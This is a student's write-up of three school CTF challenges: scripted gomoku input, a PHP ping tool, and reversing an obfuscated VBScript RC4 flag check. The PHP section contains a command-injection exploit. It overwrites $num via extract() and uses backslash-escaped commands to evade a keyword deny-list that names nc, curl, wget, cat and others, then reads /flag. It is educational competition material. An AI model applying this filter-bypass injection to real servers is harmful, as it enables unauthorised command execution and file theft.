# 2024校赛

## # Chess game

每次游戏都只有5秒的思考和输入时间，这怎么能忙的过来，但在本地尝试了几局五子棋后，发现这个AI很笨，那么就可以直接用python脚本自动帮我们来输入，节省时间。

```python
import pyautogui
import time

# 程序等待一秒，确保准备好
time.sleep(1)

# 依次输入五个棋子的位置，模拟快速输入
pyautogui.typewrite('0 0\n', interval=0.2)
# pyautogui.typewrite('1 1\n', interval=0.2)
pyautogui.typewrite('6 6\n', interval=0.2)
pyautogui.typewrite('6 7\n', interval=0.2)
pyautogui.typewrite('6 5\n', interval=0.2)
pyautogui.typewrite('6 8\n', interval=0.2)
pyautogui.typewrite('6 9\n', interval=0.2)
```

## # hashtech

### 做题思路

因为昨天刷了几道web题，今天就先选了web题开始做，开始是想着通过`$ip`夹带私货的，但一直搞不定前面的正则校验，这就是和我昨天刷的题有点不一样的地方，但上网查资料后，发现`extract()`会导致**变量覆盖**的漏洞，那么是否我放弃`$ip`，直接覆盖掉原本的`$num`会比较好，这样可以直接绕过一次正则校验，最后也就是这样做出来了。

```php
  <?php
    $num = mt_rand(3,6);
    $ip ;    # default
    extract($_REQUEST);
    foreach ($_REQUEST as $key => $value) {
        $pattern = '/ls|dir|nl|nc|cat|tail|more|flag|cut|awk|strings|od|curl|ping|tcp|\*|sort|zip|mod|sl|find|sed|cp|ty|grep|fd|df|sudo|more|cc|tac|less|head|tar|zip|gcc|uniq|vi|vim|file|xxd|date|env|\?|wget|id|\\\\x/i';
        if (preg_match($pattern, $value,$matchs)) {
            die('hacker!');
        }
    }
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (preg_match('/^[0-9.]+$/', $ip)) {
            $output = system("ping -c ".$num. " " . $ip); # linux -s
            echo "<p>".$output."</p>";
        } else {
            echo "<p>Invalid IP address format.</p>";
        }
    }
    if (isset($error)) echo "<p class='error'>$error</p>";
    ?>
```

### 完整代码

```python
import requests

# 目标URL
url = "http://10.102.32.142:43545/ping-tool.php"  

payload = "127.0.0.1"

# POST请求的数据
data = { 
    'ip': payload,
    'num': "2; l\s -ld /f\lag; le\ss /f\lag;"
}

response = requests.post(url, data=data)
# 打印响应内容（即命令执行后的结果）
print(response.text)
```

## # very bad script

### 解题思路

开始是不知道flag和re.vbs之间的关系，首先看到re.vbs里那不知道什么东西的“乱码”，就直接不想看了，然后看到flag里的字符串，以为要进行解码然后填到re.vbs里，处理了好久没弄出来。后来想着能不能得到re.vbs的源码，当时搜索了很久，发现是源码被混淆了，但一直没找到方法，后来看到[这篇文章](https://www.52pojie.cn/thread-1924143-1-1.html)才发现将前面的Execute改成 **wscript.echo**，就能直接得到脚本内容。后面就是根据逆向得到的加密算法，找到满足条件的 `userinput`，使得经过加密后得到已知的 `encryptedFlag`，而`userinput`就是我们的flag。

```vbscript
Dim userinput

userinput = InputBox("Input your flag:", "Check")
Dim key

key = "key_key_key"

Function RC4(key, input1)
    Dim S(255), inputBytes(), i, j, temp, k
    Dim result
    result = ""

    ' Initialize the state array
    For i = 0 To 255
        S(i) = i
    Next

    ' Convert input string to byte array
    ReDim inputBytes(Len(input1) - 1)
    For i = 0 To Len(input1) - 1
        inputBytes(i) = Asc(Mid(input1, i + 1, 1)) Xor Asc(Mid(key, (i Mod Len(key)) + 1, 1))
    Next

    ' Key-scheduling algorithm (KSA)
    j = 0
    For i = 0 To 255
        j = (j + S(i) + Asc(Mid(key, (i Mod Len(key)) + 1, 1))) Mod 256
        temp = S(i)
        S(i) = S(j)
        S(j) = temp
    Next

    ' Pseudo-random generation algorithm (PRGA)
    i = 0
    j = 0
    For k = 0 To UBound(inputBytes)
        i = (i + 1) Mod 256
        j = (j + S(i)) Mod 256
        temp = S(i)
        S(i) = S(j)
        S(j) = temp
        keystreamByte = S((S(i) + S(j)) Mod 256)
        encryptedByte = inputBytes(k) Xor keystreamByte Xor 32
        result = result & Right("0" & Hex(encryptedByte), 2)
    Next

    RC4 = result
End Function

Dim encryptedFlag
encryptedFlag = RC4(key, userinput)

Dim fso, file, fileContent

Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("flag.txt", 1)

fileContent = file.ReadAll
file.Close

If encryptedFlag = fileContent Then
    MsgBox "Correct", vbInformation, "Result"
Else
    MsgBox "Incorrect", vbCritical, "Result"
End If
```

### 加密过程

给出的代码是一段 VBScript，核心部分是一个 RC4 加密函数，包含以下步骤：

1. **初始化状态数组 S**
2. **将输入字符串转换为字节数组，并与密钥进行异或操作**
3. **执行密钥调度算法（KSA）**
4. **生成伪随机字节序列（PRGA）并加密数据**

特别注意，在 PRGA 阶段，除了标准的 RC4 操作外，代码还对每个字节进行了额外的 `Xor 32` 操作。

**下面是加密算法的python代码**，之后会进行复用

```python
def rc4_encrypt(key, input_str):
    S = list(range(256))
    j = 0
    # KSA
    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]
    # PRGA
    i = j = 0
    result = []
    input_bytes = [ord(c) ^ ord(key[i % len(key)]) for i, c in enumerate(input_str)]
    for k in range(len(input_bytes)):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        keystream_byte = S[(S[i] + S[j]) % 256]
        encrypted_byte = input_bytes[k] ^ keystream_byte ^ 32
        result.append(encrypted_byte)
    return ''.join('{:02X}'.format(b) for b in result)
```

### 逆向加密过程

由于 RC4 是对称加密算法，我们可以使用相同的密钥和加密后的数据来解密。

#### 获取已知的加密结果

```python
encrypted_flag_hex = "E675C3733653B0AFC6F42118F246E98245AC829FF740A316B8761D272FCDC5980511B63EE28238528B391D39177BD95544A0DE54"
encrypted_bytes = [int(encrypted_flag_hex[i:i+2], 16) for i in range(0, len(encrypted_flag_hex), 2)]
```

#### 执行 KSA 和 PRGA 生成密钥流

```python
def KSA(key):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]
    return S

def PRGA(S, n):
    i = j = 0
    keystream = []
    for _ in range(n):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        keystream_byte = S[(S[i] + S[j]) % 256]
        keystream.append(keystream_byte)
    return keystream
```

#### 解密数据

```python
key = "key_key_key"
S = KSA(key)
keystream = PRGA(S, len(encrypted_bytes))
userinput = ''
for k in range(len(encrypted_bytes)):
    key_char = ord(key[k % len(key)])
    encrypted_byte = encrypted_bytes[k]
    keystream_byte = keystream[k]
    # 逆向加密操作
    input_byte = encrypted_byte ^ keystream_byte ^ 32
    input_char_code = input_byte ^ key_char
    userinput += chr(input_char_code)
```

### 运行结果

将以上代码整合，运行后得到：

```python
print("逆向生成的 userinput:")
print(userinput)
```

**输出：**

```
逆向生成的 userinput:
flag{VVBBBS5S_1s_@n_00oooO00Oo0ooOO00ld_l4ngu@g3!!$}
```

### 完整代码

```python
key = "key_key_key"

def KSA(key):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]
    return S

def PRGA(S, N):
    i = 0
    j = 0
    keystream = []
    for k in range(N):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        keystreamByte = S[(S[i] + S[j]) % 256]
        keystream.append(keystreamByte)
    return keystream

encryptedFlag = "E675C3733653B0AFC6F42118F246E98245AC829FF740A316B8761D272FCDC5980511B63EE28238528B391D39177BD95544A0DE54"

encryptedBytes = [int(encryptedFlag[i:i+2], 16) for i in range(0, len(encryptedFlag), 2)]

S = KSA(key)
keystream = PRGA(S, len(encryptedBytes))

userinput = ""
for k in range(len(encryptedBytes)):
    key_char = ord(key[k % len(key)])
    encryptedByte = encryptedBytes[k]
    keystreamByte = keystream[k]
    inputByte = encryptedByte ^ keystreamByte ^ 32
    input_char_code = inputByte ^ key_char
    userinput += chr(input_char_code)

print("逆向生成的 userinput:")
print(userinput)

```

